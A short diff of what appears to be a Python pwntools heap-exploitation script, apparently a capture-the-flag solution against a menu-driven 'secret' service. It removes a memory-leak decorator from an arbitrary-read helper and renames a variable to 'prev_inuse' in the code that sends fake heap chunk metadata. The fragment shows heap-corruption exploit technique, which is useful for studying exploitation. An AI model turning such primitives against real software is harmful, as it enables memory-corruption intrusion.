@@ -17,7 +17,6 @@ def recvuntil(val):
    print empty
    return empty
 
-@MemLeak
 def read_anywhere(addr):
    r.send("3") # renew secret
    recvuntil("3. Huge secret\n")
@@ -109,8 +108,8 @@ def setup():
    fake2 = p64(0x100 + 1)
    fake2 += p64(0) * 31
 
-   wtf = p64(1)
-   r.send(fake + big + fake2 + wtf) # secret
+   prev_inuse = p64(1)
+   r.send(fake + big + fake2 + prev_inuse) # secret
 
    recvuntil("3. Renew secret\n")
    r.send("2") # wipe secret
